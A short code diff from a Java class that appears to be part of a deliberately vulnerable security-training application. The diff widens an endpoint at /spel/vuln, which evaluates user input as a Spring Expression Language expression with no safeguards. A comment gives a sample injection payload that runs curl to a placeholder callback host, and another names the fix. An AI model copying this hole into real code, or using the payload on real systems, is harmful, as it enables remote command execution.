@@ -21,7 +21,7 @@ public class SpEL {
      * xxx is urlencode(exp)
      * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
      */
-    @GetMapping("/spel/vuln")
+    @RequestMapping("/spel/vuln")
     public String rce(String expression) {
         ExpressionParser parser = new SpelExpressionParser();
         // fix method: SimpleEvaluationContext
